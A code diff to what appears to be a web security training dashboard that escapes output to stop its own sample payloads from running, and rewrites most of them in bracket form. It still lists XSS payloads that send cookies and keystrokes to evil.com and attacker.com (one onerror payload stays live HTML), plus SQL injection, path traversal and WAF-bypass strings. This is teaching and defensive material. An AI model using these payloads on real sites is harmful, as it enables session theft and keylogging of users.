@@ -410,11 +410,11 @@ const WAF_TEMPLATES = [
    ]},
   {type:'XSS',sev:'HIGH',status:403,
    reqs:[
-    "GET /search?q=<script>alert(document.cookie)</script>",
-    "POST /comment body=<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>",
+    "GET /search?q=[script]alert(document.cookie)[/script]",
+    "POST /comment body=[img src=x onerror=fetch('//evil.com?c='+document.cookie)]",
     "GET /page?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
-    "GET /profile?bio=<svg onload=window.location='https://attacker.com?s='+document.cookie>",
-    "POST /review body=<iframe src=javascript:alert(document.domain)>",
+    "GET /profile?bio=[svg onload=window.location='https://attacker.com']",
+    "POST /review body=[iframe src=javascript:alert(document.domain)]",
    ]},
   {type:'TRAVERSAL',sev:'HIGH',status:403,
    reqs:[
@@ -505,15 +505,19 @@ function renderLogs(){
 }
 
 function highlightPayload(req,type){
+  // CRITICAL: HTML-escape the raw string FIRST before any innerHTML insertion
+  // This prevents onerror=, onload=, <script> etc. from executing in the DOM
+  const safe=escH(req);
   const patterns={
-    SQLI:/('|--|union|select|drop|exec|xp_|OR\s*1=1)/gi,
+    SQLI:/(&apos;|--|union|select|drop|exec|xp_|OR\s*1=1)/gi,
     XSS:/(script|onerror|onload|alert|fetch|iframe|javascript:)/gi,
     TRAVERSAL:/(\.\.\/|\.\.\\|%2F|%2E|passwd|shadow|win\.ini)/gi,
     CSRF:/(CSRF|Referer:evil|attacker)/gi,
   };
   const pat=patterns[type];
-  if(!pat) return req;
-  return req.replace(pat,m=>`<span class="attack-part">${m}</span>`);
+  if(!pat) return safe;
+  // Highlight keywords in the already-escaped string — safe to inject
+  return safe.replace(pat,m=>`<span class="attack-part">${m}</span>`);
 }
 
 function selectLog(logStr){
@@ -591,12 +595,12 @@ const PAYLOADS = {
     {name:"Out-of-band",pl:"1 UNION SELECT load_file('/etc/passwd')--",impact:"Reads server filesystem"},
   ]},
   'XSS Attacks':{icon:'📜',payloads:[
-    {name:"Cookie Theft",pl:"<script>fetch('https://evil.com?c='+document.cookie)</script>",impact:"Steals session cookies"},
-    {name:"Keylogger",pl:"<script>document.onkeypress=e=>fetch('//evil.com?k='+e.key)</script>",impact:"Captures all keystrokes"},
-    {name:"DOM Redirect",pl:"<script>window.location='https://phishing-clone.com'</script>",impact:"Redirects victim to phishing site"},
+    {name:"Cookie Theft",pl:"[script]fetch('https://evil.com?c='+document.cookie)[/script]",impact:"Steals session cookies — sends them to attacker server"},
+    {name:"Keylogger",pl:"[script]document.onkeypress=e=>fetch('//evil.com?k='+e.key)[/script]",impact:"Captures every keystroke and exfiltrates in real time"},
+    {name:"DOM Redirect",pl:"[script]window.location='https://attacker.com'[/script]",impact:"Redirects victim to attacker-controlled phishing site"},
     {name:"Stored XSS via IMG",pl:`<img src=x onerror="fetch('//evil.com/'+document.cookie)">`,impact:"Triggers on every page load"},
-    {name:"SVG XSS",pl:"<svg onload=alert(document.domain)>",impact:"Confirms XSS with domain disclosure"},
-    {name:"Hex Encoded",pl:"%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",impact:"Bypasses basic WAF filters"},
+    {name:"SVG XSS",pl:"[svg onload=alert(document.domain)]",impact:"Triggers via SVG element — confirms XSS with domain disclosure"},
+    {name:"Hex Encoded",pl:"%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",impact:"URL-encoded XSS — bypasses basic WAF string filters"},
   ]},
   'Directory Traversal':{icon:'📁',payloads:[
     {name:"Linux passwd",pl:"../../../../etc/passwd",impact:"Reads system user accounts"},
@@ -649,12 +653,19 @@ function selectCat(name){
   const data=PAYLOADS[name];
   document.getElementById('payload-cat-title').textContent=name;
   document.getElementById('payload-count').textContent=data.payloads.length+' payloads';
-  document.getElementById('payload-list').innerHTML=data.payloads.map((p,i)=>`
-    <div class="payload-item" onclick="selectPayload(${i})">
-      <div class="p-name">${p.name}</div>
-      <div class="p-payload">${escH(p.pl)}</div>
-      <div class="p-impact">${p.impact}</div>
-    </div>`).join('');
+  // Build DOM nodes — never use innerHTML with payload content
+  const list=document.getElementById('payload-list');
+  list.innerHTML='';
+  data.payloads.forEach((p,i)=>{
+    const wrap=document.createElement('div');
+    wrap.className='payload-item';
+    wrap.addEventListener('click',()=>selectPayload(i));
+    const nm=document.createElement('div');nm.className='p-name';nm.textContent=p.name;
+    const pl=document.createElement('div');pl.className='p-payload';pl.textContent=p.pl; // textContent — never innerHTML
+    const im=document.createElement('div');im.className='p-impact';im.textContent=p.impact;
+    wrap.appendChild(nm);wrap.appendChild(pl);wrap.appendChild(im);
+    list.appendChild(wrap);
+  });
 }
 
 function selectPayload(i){
@@ -668,30 +679,34 @@ function escH(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/
 function analyzeSelected(){
   const payload=document.getElementById('payload-input').value.trim();
   if(!payload){document.getElementById('test-result').innerHTML='<span class="dim">Enter a payload first</span>';return;}
-  const url=document.getElementById('target-url').value||'https://target.example.com';
-  const param=document.getElementById('param-name').value||'id';
+  const rawUrl=document.getElementById('target-url').value||'https://target.example.com';
+  const url=escH(rawUrl.replace(/[<>"'`]/g,''));
+  const rawParam=document.getElementById('param-name').value||'id';
+  const param=escH(rawParam.replace(/[<>"'`]/g,''));
 
   const analysis=detectPayloadType(payload);
-  document.getElementById('test-result').innerHTML=`
-<span class="dim">// Payload Analysis Report</span>
-<span class="dim">// Generated: ${new Date().toLocaleTimeString()}</span>
-
-<span class="accent">PAYLOAD TYPE:</span>    <span class="red">${analysis.type}</span>
-<span class="accent">SEVERITY:</span>         <span class="red">${analysis.severity}</span>
-<span class="accent">TECHNIQUE:</span>        <span class="yellow">${analysis.technique}</span>
-
-<span class="dim">// Constructed Request</span>
-<span class="green">GET</span> ${url}?${param}=<span class="red">${encodeURIComponent(payload)}</span>
-
-<span class="dim">// WAF Evasion Score</span>
-<span class="accent">Encoded variants:</span>  ${analysis.variants.length}
-<span class="accent">WAF bypass risk:</span>   <span class="${analysis.bypass==='HIGH'?'red':analysis.bypass==='MEDIUM'?'yellow':'green'}">${analysis.bypass}</span>
-
-<span class="dim">// MITRE ATT&CK Mapping</span>
-<span class="purple">${analysis.mitre}</span>
-
-<span class="dim">// Detection Signatures</span>
-${analysis.sigs.map(s=>'<span class="red">RULE</span> '+s).join('\n')}`;
+  // All dynamic values sanitized — analysis fields are from our own data (safe) but still escaped
+  const safeType=escH(analysis.type);
+  const safeSev=escH(analysis.severity);
+  const safeTech=escH(analysis.technique);
+  const safeMitre=escH(analysis.mitre);
+  const safeSigs=analysis.sigs.map(s=>'<span class="red">RULE</span> '+escH(s)).join('\n');
+  // payload is encoded via encodeURIComponent — no HTML interpretation possible
+  document.getElementById('test-result').innerHTML=
+    `<span class="dim">// Payload Analysis Report</span>\n`+
+    `<span class="dim">// Generated: ${new Date().toLocaleTimeString()}</span>\n\n`+
+    `<span class="accent">PAYLOAD TYPE:</span>    <span class="red">${safeType}</span>\n`+
+    `<span class="accent">SEVERITY:</span>         <span class="red">${safeSev}</span>\n`+
+    `<span class="accent">TECHNIQUE:</span>        <span class="yellow">${safeTech}</span>\n\n`+
+    `<span class="dim">// Constructed Request (payload shown URL-encoded — not executable)</span>\n`+
+    `<span class="green">GET</span> ${url}?${param}=<span class="red">${encodeURIComponent(payload)}</span>\n\n`+
+    `<span class="dim">// WAF Evasion Score</span>\n`+
+    `<span class="accent">Encoded variants:</span>  ${analysis.variants.length}\n`+
+    `<span class="accent">WAF bypass risk:</span>   <span class="${analysis.bypass==='HIGH'?'red':analysis.bypass==='MEDIUM'?'yellow':'green'}">${escH(analysis.bypass)}</span>\n\n`+
+    `<span class="dim">// MITRE ATT&amp;CK Mapping</span>\n`+
+    `<span class="purple">${safeMitre}</span>\n\n`+
+    `<span class="dim">// Detection Signatures</span>\n`+
+    safeSigs;
 }
 
 function detectPayloadType(pl){
@@ -724,26 +739,29 @@ function simulateAttack(){
   const payload=document.getElementById('payload-input').value.trim();
   if(!payload){return;}
   const analysis=detectPayloadType(payload);
-  const url=document.getElementById('target-url').value||'https://target.example.com';
+  // Sanitize all user-controlled values — never write them raw into innerHTML
+  const rawUrl=document.getElementById('target-url').value||'https://target.example.com';
+  const safeUrl=escH(rawUrl.replace(/[<>"'`]/g,''));
   const results=['200 OK','403 Forbidden','500 Internal Server Error','200 OK (WAF Bypassed!)'];
   const r=pick(results);
-  document.getElementById('test-result').innerHTML=`
-<span class="dim">// Attack Simulation — ${new Date().toLocaleTimeString()}</span>
-
-<span class="green">→</span> Sending payload to <span class="accent">${url}</span>
-<span class="green">→</span> Payload type: <span class="red">${analysis.type}</span>
-<span class="green">→</span> Testing ${analysis.variants.length} encoding variants...
-
-<span class="dim">// Server Response</span>
-HTTP/1.1 <span class="${r.includes('403')?'red':r.includes('500')?'orange':r.includes('Bypassed')?'red':'green'}">${r}</span>
-X-WAF-Action: ${r.includes('403')?'BLOCKED':'ALLOWED'}
-X-WAF-Rule: ${r.includes('403')?analysis.sigs[0]:'None triggered'}
-Response-Time: ${rnd(80,450)}ms
-
-<span class="dim">// WAF Log Entry Generated</span>
-${new Date().toISOString()} ATTACK ${analysis.type} from ${pick(ATTACK_IPS)} → ${r.includes('403')?'BLOCKED':'PASSED'}
-
-<span class="${r.includes('Bypassed')||!r.includes('403')?'red':'green'}">${r.includes('403')? '✓ WAF blocked the attack successfully': '⚠ Payload may have bypassed WAF — review rules'}</span>`;
+  const safeType=escH(analysis.type);
+  const safeSig=escH(String(analysis.sigs[0]||'None'));
+  const safeIP=escH(pick(ATTACK_IPS));
+  const blocked=r.includes('403');
+  const bypassed=r.includes('Bypassed')||!blocked;
+  document.getElementById('test-result').innerHTML=
+    `<span class="dim">// Attack Simulation — ${new Date().toLocaleTimeString()}</span>\n\n`+
+    `<span class="green">&rarr;</span> Sending payload to <span class="accent">${safeUrl}</span>\n`+
+    `<span class="green">&rarr;</span> Payload type: <span class="red">${safeType}</span>\n`+
+    `<span class="green">&rarr;</span> Testing ${analysis.variants.length} encoding variants...\n\n`+
+    `<span class="dim">// Server Response</span>\n`+
+    `HTTP/1.1 <span class="${blocked?'red':r.includes('500')?'orange':bypassed?'red':'green'}">${escH(r)}</span>\n`+
+    `X-WAF-Action: ${blocked?'BLOCKED':'ALLOWED'}\n`+
+    `X-WAF-Rule: ${blocked?safeSig:'None triggered'}\n`+
+    `Response-Time: ${rnd(80,450)}ms\n\n`+
+    `<span class="dim">// WAF Log Entry Generated</span>\n`+
+    `${new Date().toISOString()} ATTACK ${safeType} from ${safeIP} &rarr; ${blocked?'BLOCKED':'PASSED'}\n\n`+
+    `<span class="${bypassed?'red':'green'}">${blocked?'&#10003; WAF blocked the attack successfully':'&#9888; Payload may have bypassed WAF &mdash; review rules'}</span>`;
 }
 
 // ─── IOC HUNT CONSOLE ─────────────────────────────────────────────────────────
@@ -864,10 +882,10 @@ const SCENARIOS=[
   {name:'Stored XSS Attack',icon:'📜',type:'XSS',color:'orange',
    desc:'Malicious script injected into comment field executes for all visitors',
    steps:[
-    {type:'attack', txt:'Attacker finds unsanitized comment field on a blog post',code:'// Testing: does the field accept HTML?\nComment: <b>Hello</b>  → Renders as bold text\n→ HTML injection confirmed'},
-    {type:'attack', txt:'Attacker posts comment containing cookie-stealing JavaScript',code:"Comment: Great post! <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"},
-    {type:'neutral',txt:'Server stores the comment including malicious script in the database',code:'INSERT INTO comments (post_id, body) VALUES (42, "Great post! <script>fetch...")'},
-    {type:'attack', txt:'Every user who views the blog post now executes the malicious script',code:'Server renders page:\n<div class="comment">Great post! <script>fetch(\'https://attacker.com/steal?c=\'+document.cookie)</script></div>'},
+    {type:'attack', txt:'Attacker finds unsanitized comment field on a blog post',code:'// Testing: does the field accept HTML?\nComment: [b]Hello[/b]  -- Renders as bold text\n-- HTML injection confirmed'},
+    {type:'attack', txt:'Attacker posts comment containing cookie-stealing JavaScript',code:"Comment: Great post! [script]fetch('https://attacker.com/steal?c='+document.cookie)[/script]"},
+    {type:'neutral',txt:'Server stores the comment including malicious script in the database',code:"INSERT INTO comments (post_id, body) VALUES (42, 'Great post! [script]fetch...[/script]')"},
+    {type:'attack', txt:'Every user who views the blog post now executes the malicious script',code:"Server renders page:\n[div class='comment']Great post! [script]fetch('https://attacker.com/steal?c='+document.cookie)[/script][/div]"},
     {type:'attack', txt:'Victim browser executes script: session cookies sent to attacker',code:'GET https://attacker.com/steal?c=SESSIONID=VICTIM_TOKEN HTTP/1.1\n→ Attacker now has victim session'},
     {type:'defense',txt:'Defense: Output encoding, Content Security Policy, HTTPOnly cookies',code:'// Server-side: always encode output\nescapedComment = htmlspecialchars(comment, ENT_QUOTES)\n// CSP header:\nContent-Security-Policy: default-src \'self\'; script-src \'self\'\n// Cookie:\nSet-Cookie: SESS=val; HttpOnly; SameSite=Strict'},
    ]},
@@ -893,13 +911,13 @@ function loadScenario(i){
   document.getElementById('sim-scenario-title').textContent=activeScenario.name+' — Step-by-Step';
   document.getElementById('run-btn').style.display='';
   document.getElementById('sim-output').innerHTML=`
-    <div style="color:var(--dim);font-size:11px;margin-bottom:12px">${activeScenario.desc}</div>
+    <div style="color:var(--dim);font-size:11px;margin-bottom:12px">${escH(activeScenario.desc)}</div>
     <div class="step-flow">
       ${activeScenario.steps.map((s,i)=>`
         <div class="step-item ${s.type}">
           <div class="step-num ${s.type==='neutral'?'neutral':''}">${i+1}</div>
           <div>
-            <div class="step-text">${s.txt}</div>
+            <div class="step-text">${escH(s.txt)}</div>
             <div class="step-code">${escH(s.code)}</div>
           </div>
         </div>`).join('')}
